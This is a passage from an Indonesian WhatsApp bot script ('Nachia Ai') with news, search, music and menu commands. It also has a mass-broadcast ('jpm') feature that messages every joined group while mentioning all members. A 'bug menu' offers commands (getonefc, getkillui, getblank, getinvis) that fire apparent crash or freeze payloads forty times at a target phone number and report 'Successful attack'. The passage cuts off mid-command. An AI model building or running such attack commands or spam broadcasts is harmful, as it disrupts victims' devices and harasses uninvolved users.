    const blacklistPath = path.join(__dirname, './database/blacklist.json')

    let mediaData = null
    let mediaType = null
    let finalText = text
    let quotedMessage = m.quoted

    if (!quotedMessage && !text) {
        return reply(`Contoh: ${prefix + command} pesan atau reply ke pesan`)
    }

    if (quotedMessage) {
        const quotedMime = quotedMessage.mimetype || ''
        
        if (quotedMime.includes('image')) {
            mediaType = 'image'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download gambar')
            }
        } 
        else if (quotedMime.includes('video')) {
            mediaType = 'video'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download video')
            }
        }
        else if (quotedMessage.text || quotedMessage.conversation) {
            mediaType = 'text'
            finalText = quotedMessage.text || quotedMessage.conversation || text
        }
    }

    try {
        const allGroups = await conn.groupFetchAllParticipating()
        let groupIds = Object.keys(allGroups)
        const groupMetadata = allGroups

        let blacklist = []
        if (fs.existsSync(blacklistPath)) {
            blacklist = JSON.parse(fs.readFileSync(blacklistPath, 'utf-8'))
        }
        
        const totalGroups = groupIds.length
        groupIds = groupIds.filter(id => !blacklist.includes(id))
        const filteredGroups = totalGroups - groupIds.length

        if (groupIds.length === 0) {
            return reply(`❌ Tidak ada grup yang bisa dikirim (${filteredGroups} grup di-blacklist)`)
        }

        reply(`Mulai JPM ke ${groupIds.length} grup\nDelay: ${delayTime}ms\nType: ${mediaType || 'Teks'}`)

        let successCount = 0
        let failedCount = 0
        let autoBlacklist = []

        for (const groupId of groupIds) {
            try {
                const participants = groupMetadata[groupId]?.participants || []
                const mentions = participants.map(p => p.id)
                
                if (mediaType === 'image' && mediaData) {
                    await conn.sendMessage(groupId, { 
                        image: mediaData,
                        caption: finalText || '',
                        mentions: mentions
                    })
                } 
                else if (mediaType === 'video' && mediaData) {
                    await conn.sendMessage(groupId, { 
                        video: mediaData,
                        caption: finalText || '',
                        mentions: mentions
                    })
                }
                else {
                    await conn.sendMessage(groupId, { 
                        text: finalText || text,
                        mentions: mentions
                    })
                }
                
                successCount++
                await delay(delayTime)
                
            } catch (err) {
                failedCount++
                console.error(`Gagal ke grup ${groupId}:`, err.message)
                
                if (err.message.includes('not-authorized') || 
                    err.message.includes('forbidden') ||
                    err.message.includes('not admin')) {
                    autoBlacklist.push(groupId)
                }
            }
        }

        if (autoBlacklist.length > 0) {
            let currentBlacklist = []
            if (fs.existsSync(blacklistPath)) {
                currentBlacklist = JSON.parse(fs.readFileSync(blacklistPath, 'utf-8'))
            }
            
            const newBlacklist = [...new Set([...currentBlacklist, ...autoBlacklist])]
            fs.writeFileSync(blacklistPath, JSON.stringify(newBlacklist, null, 2))
        }

        reply(`✅ Berhasil: ${successCount}/${groupIds.length} grup\n❌ Gagal: ${failedCount}\n📝 Auto blacklist: ${autoBlacklist.length} grup`)
        
    } catch (error) {
        console.error('Gagal mengambil grup:', error)
        reply('❌ Gagal mengambil daftar grup')
    }
}
break;      
 case "addbl": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fs = require('fs')
    const path = require('path')
    const dbPath = path.join(__dirname, './database/blacklist.json')
    
    let blacklist = []
    if (fs.existsSync(dbPath)) {
        blacklist = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
    }
    
    const groupId = m.chat
    
    if (!blacklist.includes(groupId)) {
        blacklist.push(groupId)
        fs.writeFileSync(dbPath, JSON.stringify(blacklist, null, 2))
        reply(`✅ Group ini ditambahkan ke blacklist`)
    } else {
        reply('❌ Group sudah ada dalam blacklist')
    }
}
break;
case "delbl": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    if (!text) return reply("Contoh: delbl 1203631234567890@g.us")
    
    const fs = require('fs')
    const path = require('path')
    const dbPath = path.join(__dirname, './database/blacklist.json')
    
    if (!fs.existsSync(dbPath)) {
        return reply('Database blacklist tidak ditemukan')
    }
    
    let blacklist = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
    
    if (blacklist.includes(text)) {
        blacklist = blacklist.filter(id => id !== text)
        fs.writeFileSync(dbPath, JSON.stringify(blacklist, null, 2))
        reply(`✅ Group ${text} dihapus dari blacklist`)
    } else {
        reply('❌ Group tidak ditemukan dalam blacklist')
    }
}
break;
case 'public': {
  if (!isCreator) return m.reply(mess.OnlyOwner)

  conn.public = true

  let caption = 
`🔥 *MODE BERUBAH!*

> Sekarang bot dalam mode: *PUBLIC*
✅ Semua orang bisa memakai bot.`

  await conn.sendMessage(m.chat, {
    text: caption,
    contextInfo: {
      externalAdReply: {
        title: " PUBLIC MODE AKTIF",
        body: "Nachia Ai",
        thumbnailUrl: "https://aliceecdn.vercel.app/file/dd42ae205c.jpeg", // ganti sesuai selera
        sourceUrl: "https://instagram.com/ibnuu1st",
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m })
}
break

case 'self': {
 if (!isCreator) return m.reply(mess.OnlyOwner)

 conn.public = false

 let caption = 
`❕ *MODE BERUBAH!*

> Sekarang bot dalam mode: *SELF*
📛 Hanya *Ibnu (Owner)* yang bisa memakai bot🚮.`

 await conn.sendMessage(m.chat, {
 text: caption,
 contextInfo: {
 externalAdReply: {
 title: " SELF MODE AKTIF",
 body: "Nachia Ai",
 thumbnailUrl: "https://aliceecdn.vercel.app/file/a39b39b221.jpeg", 
 sourceUrl: "https://instagram.com/ibnuu1st", 
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m })
}
break
      
case 'afif':
case 'pencipta':
case 'owner': case 'own': {
 let nugget = "please dont not spam or call my own";
 let vcard = `BEGIN:VCARD\nVERSION:3.0\nN:WhatsApp;nugget\nORG:nugget\nTITLE:soft\nitem1.TEL;waid=6283115376765:6283115376765\nitem1.X-ABLabel:Ponsel\nitem2.URL:https://youtube.com/@dullzpedia\nitem2.X-ABLabel:💬 More\nitem3.EMAIL;type=INTERNET:iyakahibnuu@gmail.com\nitem3.X-ABLabel:Email\nitem4.ADR:;;Jepang;;;;\nitem4.X-ABADR:💬 More\nitem4.X-ABLabel:Lokasi\nEND:VCARD`;

 await conn.sendMessage(m.chat, { 
 text: "Ini owner nugget kak, kalo ada yang eror lapor aja" 
 }, { quoted: m });

 const sentMsg = await conn.sendMessage(m.chat, {
 contacts: {
 displayName: "ibnuu",
 contacts: [{ vcard }],
 },
 contextInfo: {
 externalAdReply: {
 title: "Nachia Ai",
 body: nugget, 
 thumbnailUrl: `https://aliceecdn.vercel.app/file/dd42ae205c.jpeg`,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true,
 }
 }
 }, { quoted: m});
}
break           
   case 'iqc':
case 'iphonec': {
    if (!text) return reply(`📸 *Cara penggunaan:*\nKetik *${prefix + command} [teks]*\nContoh: *${prefix + command} uget nih*`);
    
    try {
        await conn.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
        
        let teks = encodeURIComponent(text);
        let apiUrl = `https://api.the-nugget.my.id/canvas/iqc?text=${teks}&chatTime=10%3A00&statusBarTime=100`;
        
        let response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`HTTP Error: ${response.status}`);
        }
        
        let arrayBuffer = await response.arrayBuffer();
        let buffer = Buffer.from(arrayBuffer);
        
        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: `✅ *Done By Gweh*\n\n📝 Teks: ${text}`
        }, { quoted: m });
        
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}});
        
    } catch (error) {
        console.error('IQC Error:', error);
        m.reply('❌ Error: ' + error.message);
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}});
    }
}
break;    
     case 'tribun': {
    try {
        await conn.sendMessage(m.chat, {react: {text: '📰', key: m.key}});
        
        let apiUrl = `https://api.the-nugget.my.id/berita/tribun?apikey=uget&limit=10`;
        let response = await fetch(apiUrl);
        let result = await response.json();
        
        if (!result.status || !result.data || result.data.length === 0) {
            return reply('❌ Gagal mengambil berita!');
        }
        
        let berita = result.data;
        
        if (!text) {
            let beritaText = `*📰 BERITA TRIBUN TERKINI*\n`;
            beritaText += `🗓️ ${new Date().toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}\n`;
            beritaText += `━━━━━━━━━━━━━━━━━━━━\n\n`;
            
            for (let i = 0; i < berita.length; i++) {
                let item = berita[i];
                let pubDate = new Date(item.pubDate).toLocaleString('id-ID', { 
                    hour: '2-digit', 
                    minute: '2-digit',
                    timeZone: 'Asia/Jakarta'
                });
                
                beritaText += `*${i + 1}.* ${item.title}\n`;
                beritaText += `   🕐 ${pubDate} WIB\n`;
                beritaText += `   🔗 ${item.link}\n\n`;
            }
            
            beritaText += `━━━━━━━━━━━━━━━━━━━━\n`;
            beritaText += `_Ketik *${prefix}tribun [nomor]* untuk baca detail_`;
            
            await reply(beritaText);
            
            global.newsResults = global.newsResults || {};
            global.newsResults[m.sender] = {
                data: berita,
                timestamp: Date.now()
            };
            
        } else {
            let index = parseInt(text) - 1;
            
            if (isNaN(index) || index < 0 || index >= berita.length) {
                return reply('❌ Nomor tidak valid!');
            }
            
            let item = berita[index];
            let pubDate = new Date(item.pubDate).toLocaleString('id-ID', { 
                weekday: 'long',
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: '2-digit', 
                minute: '2-digit',
                timeZone: 'Asia/Jakarta'
            });
            
            let detailText = `*📰 DETAIL BERITA TRIBUN*\n\n`;
            detailText += `*${item.title}*\n\n`;
            detailText += `🕐 ${pubDate} WIB\n`;
            detailText += `🔗 Link: ${item.link}\n`;
            
            await reply(detailText);
        }
        
        await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}});
        
    } catch (error) {
        console.error('Tribun Error:', error);
        m.reply('❌ Error: ' + error.message);
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}});
    }
}
break;  
    // FITUR BERITA NIH🗿
case 'berita':
case 'news': {
    if (!text) {
        try {
            reply('📰 Mengambil berita terbaru...');
            
            let newsApi = await fetch(`https://api.the-nugget.my.id/berita/cnn?apikey=uget&limit=10`);
            let newsData = await newsApi.json();
            
            if (!newsData.status || !newsData.data || newsData.data.length === 0) {
                return reply('❌ Gagal mengambil berita!');
            }
            
            let berita = newsData.data;
            let beritaText = `*📰 BERITA TERKINI - CNN INDONESIA*\n`;
            beritaText += `🗓️ ${new Date().toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}\n`;
            beritaText += `━━━━━━━━━━━━━━━━━━━━\n\n`;
            
            for (let i = 0; i < berita.length; i++) {
                let item = berita[i];
                let pubDate = new Date(item.pubDate).toLocaleString('id-ID', { 
                    hour: '2-digit', 
                    minute: '2-digit',
                    timeZone: 'Asia/Jakarta'
                });
                
                beritaText += `*${i + 1}.* ${item.title}\n`;
                beritaText += `   🕐 ${pubDate} WIB\n`;
                beritaText += `   🔗 ${item.link}\n\n`;
            }
            
            beritaText += `━━━━━━━━━━━━━━━━━━━━\n`;
            beritaText += `_Ketik *${prefix}news [nomor]* untuk baca detail_\n`;
            beritaText += `_Contoh: ${prefix}news 1_`;
            
            await reply(beritaText);
            
            global.newsResults = global.newsResults || {};
            global.newsResults[m.sender] = {
                data: berita,
                timestamp: Date.now()
            };
            
        } catch (error) {
            console.error('News Error:', error);
            m.reply('❌ Error: ' + error.message);
        }
    } else {
        if (!global.newsResults || !global.newsResults[m.sender]) {
            return reply('❌ Tidak ada daftar berita! Ketik *news* dulu');
        }
        
        let index = parseInt(text) - 1;
        let berita = global.newsResults[m.sender].data;
        
        if (isNaN(index) || index < 0 || index >= berita.length) {
            return reply('❌ Nomor tidak valid!');
        }
        
        let item = berita[index];
        let pubDate = new Date(item.pubDate).toLocaleString('id-ID', { 
            weekday: 'long',
            year: 'numeric', 
            month: 'long', 
            day: 'numeric',
            hour: '2-digit', 
            minute: '2-digit',
            timeZone: 'Asia/Jakarta'
        });
        
        let detailText = `*📰 DETAIL BERITA*\n\n`;
        detailText += `*${item.title}*\n\n`;
        detailText += `🕐 ${pubDate} WIB\n`;
        detailText += `🔗 Link: ${item.link}\n`;
        if (item.thumbnail) {
            detailText += `🖼️ Thumbnail: ${item.thumbnail}\n\n`;
            await conn.sendMessage(m.chat, { image: { url: item.thumbnail }, caption: detailText }, { quoted: m });
        } else {
            await reply(detailText);
        }
    }
}
break;  
    case 'allmenu': {
    
    await conn.sendMessage(m.chat, {
        react: {
            text: "✨", 
            key: m.key
        }
    });

    let anu = `
*haii ${pushname}, perkenalkan saya adalah ${botname}, saya dapat membantu anda mencari sesuatu atau sekedar mendengarkan music yang ingin anda putar, mohon jangan spam ya💞*

┏━━━━━━━━━━━━━━┓
   Hii *${pushname}* 👋  
   Jangan spam/call bot ya 😁🙏  
┗━━━━━━━━━━━━━━┛

╭─❒ ☄ *INFO BOT*
│ 🤖 Nama   : *${botname}*
│ 👤 Owner  : *${ownername}*
│ 🧩 Versi  : *${botver}*
│ 💩 User   : @${m.sender.split("@")[0]}
│ ⚙️ Mode   : *CASE*
╰──────────────❒

╭─❒  *OWNER  MENU* [ 🔮 ]
│ > addcase
│ > listcase
│ > scrape
│ > managepanel
│ > managepanel list
│ > cpanel
│ > cpanelv2
│ > playch
│ > jpmch
│ > jpmht
│ > jpm
│ > cleardbbl
│ > addbl
│ > delbl
│ > listbl
│ > hpoll
│ > tagall 
│ > hidetag
│ > backup
│ > public
│ > self
│ > getonefc [ num ]
│ > getkillui  [ num ]
│ > getblank [ num ]
│ > getdelay [ num ]
╰──────────────❒

╭─❒  *BROADCAST MENU* [ 🎱 ]
│ > jpm
│ > jpmch
│ > jpmht
│ > cleardbbl
│ > addbl
│ > delbl
│ > listbl
╰──────────────❒

╭─❒  *DANGER  MENU* [ 🚫 ]
│ > getonefc [ num ]
│ > getkillui  [ num ]
│ > getblank [ num ]
│ > getdelay [ num ]
╰──────────────❒

╭─❒  *PANEL  MENU* [ ⚜ ]
│ > cpanel
│ > cpanelv2
│ > managepanel
│ > managepanel list
╰──────────────❒

╭─❒  *RANDOM MENU* [ 🌠 ]
│ > cecanran 
│ > iqc
│ > papribka
│ > idch
│ > cekidch
╰──────────────❒

╭─❒  *NEWS MENU* [ 📰 ]
│ > news [ num ]
│ > news 
│ > tribun [ num ]
│ > tribun
╰──────────────❒

╭─❒  *SEARCH MENU* [ 📥 ]
│ > yta [ link ]
│ > tiktok [ link ]
╰──────────────❒

╭─❒  *SEARCH MENU* [🔎]
│ > play [ query ]
│ > ytsearch [ query ]
│ > nuggetpin [ query ]
╰──────────────❒
🕒 Runtime: *${runtime(process.uptime())}*  
> © kenz cowo zaa`;

    conn.sendMessage(m.chat, {
        document: fs.readFileSync("./package.json"),
        fileName: "Kenz x Zaa",
        mimetype: "application/pdf",
        fileLength: 99999,
        pageCount: 2482008,
        caption: anu,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            mentionedJid: [sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: newsletterName,
                newsletterJid: "120363405370468533@newsletter",
            },
            externalAdReply: {
                title: "Lizaa",
                body: "Kean ",
                thumbnailUrl: `https://files.catbox.moe/u6nlrj.jpeg`,
                sourceUrl: "instagram.com/ibnuu1st",
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: m });
    break;
} 
case "listbl": {
    const fs = require('fs')
    const path = require('path')
    const dbPath = path.join(__dirname, './database/blacklist.json')
    
    if (!fs.existsSync(dbPath)) {
        return reply('Database blacklist belum ada')
    }
    
    const blacklist = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
    
    if (blacklist.length === 0) {
        return reply('📋 Blacklist kosong')
    }
    
    let text = '📋 *Daftar Blacklist:*\n\n'
    blacklist.forEach((id, i) => {
        text += `${i + 1}. ${id}\n`
    })
    text += `\nTotal: ${blacklist.length} group`
    
    reply(text)
}
break;
   case "jpmch": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    
    const fs = require('fs')
    const path = require('path')
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms))
    const delayTime = 5000
    const dbPath = path.join(__dirname, './database/listidch.json')

    if (!fs.existsSync(dbPath)) {
        return reply('❌ File database/listidch.json tidak ditemukan')
    }

    let channelIds = []
    try {
        channelIds = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
        if (!Array.isArray(channelIds) || channelIds.length === 0) {
            return reply('❌ Database channel kosong')
        }
    } catch (e) {
        console.error('Error baca database:', e)
        return reply('❌ Gagal membaca database channel')
    }

    let mediaData = null
    let mediaType = null
    let finalText = text
    let quotedMessage = m.quoted

    if (!quotedMessage && !text) {
        return reply(`Contoh: ${prefix + command} pesan atau reply ke pesan`)
    }

    if (quotedMessage) {
        const quotedMime = quotedMessage.mimetype || ''
        
        if (quotedMime.includes('image')) {
            mediaType = 'image'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download gambar')
            }
        } 
        else if (quotedMime.includes('video')) {
            mediaType = 'video'
            try {
                mediaData = await quotedMessage.download()
                finalText = quotedMessage.caption || text || ''
            } catch (e) {
                console.log('Download error:', e)
                return reply('Gagal download video')
            }
        }
        else if (quotedMessage.text || quotedMessage.conversation) {
            mediaType = 'text'
            finalText = quotedMessage.text || quotedMessage.conversation || text
        }
    }

    reply(`Mulai JPM ke ${channelIds.length} channel\nDelay: ${delayTime}ms\nType: ${mediaType || 'Teks'}`)

    let successCount = 0
    let failedCount = 0

    for (const channelId of channelIds) {
        try {
            if (mediaType === 'image' && mediaData) {
                await conn.sendMessage(channelId, { 
                    image: mediaData,
                    caption: finalText || '',
                }, { quoted: null })
            } 
            else if (mediaType === 'video' && mediaData) {
                await conn.sendMessage(channelId, { 
                    video: mediaData,
                    caption: finalText || '',
                }, { quoted: null })
            }
            else {
                await conn.sendMessage(channelId, { 
                    text: finalText || text,
                }, { quoted: null })
            }
            
            successCount++
            await delay(delayTime)
            
        } catch (err) {
            failedCount++
            console.error(`Gagal ke channel ${channelId}:`, err.message)
        }
    }

    reply(`✅ Berhasil: ${successCount}/${channelIds.length} channel\n❌ Gagal: ${failedCount}`)
}
break;
   case "addch": {
    if (!isCreator) return reply("kacau ye wkkwkak")
    if (!text) return reply("Masukkan ID channel")
    
    const fs = require('fs')
    const path = require('path')
    const dbPath = path.join(__dirname, './database/listidch.json')
    
    let channelIds = []
    if (fs.existsSync(dbPath)) {
        channelIds = JSON.parse(fs.readFileSync(dbPath, 'utf-8'))
    }
    
    if (!channelIds.includes(text)) {
        channelIds.push(text)
        fs.writeFileSync(dbPath, JSON.stringify(channelIds, null, 2))
        reply('✅ Channel berhasil ditambahkan')
    } else {
        reply('❌ Channel sudah ada dalam database')
    }
}
break
        
   case 'cecan':
case 'cecanran': {
    try {
        await conn.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
        
        let apiUrl = 'https://api.the-nugget.my.id/random/cecanran';
        
        let response = await fetch(apiUrl);
        
        if (!response.ok) {
            throw new Error(`HTTP Error: ${response.status}`);
        }
        
        let contentType = response.headers.get('content-type');
        
        if (contentType && contentType.includes('application/json')) {
            let errorData = await response.json();
            return reply(`❌ Error: ${errorData.message || 'Gagal mengambil gambar'}`);
        }
        
        if (contentType && contentType.includes('image/')) {
            let arrayBuffer = await response.arrayBuffer();
            let buffer = Buffer.from(arrayBuffer);
            
            await conn.sendMessage(m.chat, {
                image: buffer,
                caption: '📸 *Done mok*'
            }, { quoted: m });
            
            await conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}});
        } else {
            reply('❌ Response bukan format gambar!');
        }
        
    } catch (error) {
        console.error('Cecan Error:', error);
        m.reply('❌ Error: ' + error.message);
        await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}});
    }
}
break;  
 case "listcase": {
    if (!isCreator) return reply(mess.OnlyOwner)
    
    const fs = require('fs')
    const path = require('path')
    
    const code = fs.readFileSync('./nachia.js', 'utf8')
    const regex = /case\s+["'`](.+?)["'`]\s*:/g
    let match
    const cases = []
    
    while ((match = regex.exec(code)) !== null) {
        cases.push(match[1])
    }
    
    const uniqueCases = [...new Set(cases)]
    const totalCases = uniqueCases.length
    
    let caseList = `📋 *DAFTAR CASE*\n`
    caseList += `━━━━━━━━━━━━━━━━━━━━\n`
    caseList += `Total: ${totalCases}\n`
    caseList += `━━━━━━━━━━━━━━━━━━━━\n\n`
    
    let line = ''
    uniqueCases.forEach((cmd, i) => {
        line += `┃ ${cmd.padEnd(15)} `
        if ((i + 1) % 3 === 0) {
            caseList += line + '┃\n'
            line = ''
        }
    })
    
    if (line !== '') {
        caseList += line + '┃\n'
    }
    
    caseList += `\n━━━━━━━━━━━━━━━━━━━━`
    
    reply(caseList)
    break
}      
case 'searchpin':
case 'nuggetpin': {
    if (!text) return reply(`Format salah, contoh: \n${prefix + command} Anime`);
    if (budy.match(`tobrut|susu|seksi|sexy`)) return reply('NGAPAIN KIDSS??, INGET TUHAN DEKKK!');
    
    await conn.sendMessage(m.chat, {react: {text: '⏳', key: m.key}});
    
    async function pinterest(query) {
        try {
            const axios = require('axios');
            const url = `https://api.the-nugget.my.id/search/pinterest?apikey=uget&q=${encodeURIComponent(query)}&limit=20`;
            const res = await axios.get(url);
            if (!res.data || !res.data.status || !res.data.data) return [];
            return res.data.data.map(img => ({
                image: img,
                source: img
            }));
        } catch (err) {
            console.error(err);
            return [];
        }
    }

    let anutrest = await pinterest(text);
    if (!anutrest || anutrest.length === 0) return reply("Error, Foto Tidak Ditemukan");

    let selectedImages = anutrest.slice(0, 20);
    let anu = [];

    for (let i = 0; i < selectedImages.length; i++) {
        let imgsc = await prepareWAMessageMedia(
            { image: { url: selectedImages[i].image } }, 
            { upload: conn.waUploadToServer }
        );

        anu.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: `Foto ke *${i + 1}*`, 
                hasMediaAttachment: true,
                ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Lihat di Pinterest",
                        url: selectedImages[i].source
                    })
                }]
            }), 
            footer: proto.Message.InteractiveMessage.Footer.create({
                text: "iem nugget🥶"
            })
        });
    }

    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Result For- *${text}*`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards: anu
                    })
                })
            }
        }
    }, {
        userJid: sender,
        quoted: m
    });
    
    conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;    
   case 'ytsearch': {
    if (!text) return reply('❌ Masukkan judul video! Jangan cuma diem!');

    const yts = require('yt-search');

    try {
        const search = await yts(text);
        const video = search.videos[0];

        if (!video) return reply('💥 Video gak ketemu, coba lagi!');

        const caption = `
┏━━ YOUTUBE SEARCH ━━┓
🎬 *${video.title.toUpperCase()}*
👤 Channel: *${video.author.name}*
⏱ Durasi: *${video.timestamp}*
👁 Views: *${video.views.toLocaleString()}*
🔗 ${video.url}
┗━━━━━━━━━━━━━┛
        `.trim();

        await conn.sendMessage(
            m.chat,
            { image: { url: video.thumbnail }, caption },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
        reply('💀 Waduh, error! lapor nugget sana.');
    }
}
break    
     case "lizaa": {    
let menu = `
 ▢ name : ${botname}
 ▢ Creator : t.me/sukaLKK
 ▢ Version : ${botver}
 ▢ Type : Case [ cjs ]

┏━【 BUG MENU 】━┓
│  ⌬ .getblank <nomor>
│  ⌬ .getonefc <nomor>
│  ⌬ .getdelay <nomor>
│  ⌬ .getkillui <nomor>
│  ⌬ .getinvis <nomor>
╰━━━━━━━━━╯`;

conn.sendMessage(m.chat, {
  footer: `lizaxkenz`,
  buttons: [
    {
      buttonId: 'action',
      buttonText: { displayText: '📂 Pilih Menu' },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIK Ai🗯',
          sections: [
            {
              title: 'INFORMATION',
              rows: [
                {
                  title: 'Script 📥',
                  description: 'Display Script nachia',
                  id: '.sc'
                },
                {
                  title: 'Owner 👑',
                  description: 'Contact Owner Bot',
                  id: '.owner'
                }
              ]
            },
            {
              title: 'Elisa Keanu',
              rows: [
                {
                  title: 'BACK TO MENU',
                  description: 'kembali ke menu utama',
                  id: '.menu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: { url: 'https://raw.githubusercontent.com/IkyyExecutive-v2/IkyySukaNgewe/main/uploads/1772235024443_95671_1772235024018_file_1199.jpg' },
  caption: menu,
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    mentionedJid: [sender],
    forwardedNewsletterMessageInfo: {
      newsletterName: 'kenz punya zaa',
      newsletterJid: '120363405370468533@newsletter'
    },
    externalAdReply: {
      title: 'LIZA CEWE KENZ',
      body: 'KENZ PUNYA ZAA',
      thumbnailUrl: 'https://raw.githubusercontent.com/IkyyExecutive-v2/IkyySukaNgewe/main/uploads/1772235140157_58728_1772235139659_file_1200.jpg',
      sourceUrl: '',
      mediaType: 1,
      renderLargerThumbnail: false
    }
  }
}, { quoted: m });
  break;
} 
 case 'play':
case 'song': {
    if (!text) return reply(`Masukkan judul lagu!\nContoh: *${prefix}play jakarta hari ini*`);
    
    try {
        reply('🔍 Mencari lagu...');
        
        let api = await fetch(`https://api.deline.web.id/downloader/ytplay?q=${encodeURIComponent(text)}`);
        let data = await api.json();
        
        if (data.status && data.result?.dlink) {
            let song = data.result;
            
            await conn.sendMessage(m.chat, {
                audio: { url: song.dlink },
                mimetype: 'audio/mpeg',
                fileName: `${song.title}.mp3`.replace(/[<>:"/\\|?*]+/g, '_'),
                ptt: false
            }, { quoted: m });
            
            reply(`✅ Lagu ditemukan!\n🎵 ${song.title}`);
            return;
        }
        
        reply('❌ Lagu tidak ditemukan! Coba judul lain.');
        
    } catch (error) {
        console.error('Play Error:', error);
        m.reply('❌ Error: ' + error.message);
    }
}
break;
case 'getonefc': {
  if (!isCreator) 
    return reply('*[Akses Ditolak!!]*\nFitur Khusus Owner‼️');
    
  if (!q) 
    return reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  reply(`\`𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ${command}
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

for (let i = 0; i < 20; i++) {
  await oneMsg(target)
  await oneMsg(target)
}
  
  conn.sendMessage(from, {
    react: {
      text: "✅",
      key: m.key
    }
  });
}
break;    
case 'getinvis': {
  if (!isCreator) 
    return reply('*[Akses Ditolak!!]*\nFitur Khusus Owner‼️');
    
  if (!q) 
    return reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  reply(`\`𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ${command}
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

for (let i = 0; i < 20; i++) {
  await invisFc(target)
  await invisFc(target)
}
  
  conn.sendMessage(from, {
    react: {
      text: "✅",
      key: m.key
    }
  });
}
break;    
case 'getkillui': {
  if (!isCreator) 
    return reply('*[Akses Ditolak!!]*\nFitur Khusus Owner‼️');
    
  if (!q) 
    return reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  reply(`\`𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ${command}
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

for (let i = 0; i < 20; i++) {
  await LocationSilent(conn, target)
  await LocationSilent(conn, target)
}
  
  conn.sendMessage(from, {
    react: {
      text: "✅",
      key: m.key
    }
  });
}
break;    
case 'getblank': {
  if (!isCreator) 
    return reply('*[Akses Ditolak!!]*\nFitur Khusus Owner‼️');
    
  if (!q) 
    return reply(`⚠️ *Example:* ${command} 62xxxx`);

  let pepec = q.replace(/[^0-9]/g, "");
  let target = pepec + '@s.whatsapp.net';

  reply(`\`𝗦𝗨𝗖𝗖𝗘𝗦 𝗦𝗘𝗡𝗗 𝗕𝗨𝗚\`
ᴛʏᴘᴇ : ${command}
ᴛᴀʀɢᴇᴛ : ${target}
ꜱᴛᴀᴛᴜꜱ : 𝚂𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕 𝚊𝚝𝚝𝚊𝚌𝚔`);

for (let i = 0; i < 20; i++) {
  await BlankXFrezeeInfinity(conn, target)
  await BlankXFrezeeInfinity(conn, target)
}
  
  conn.sendMessage(from, {
    react: {
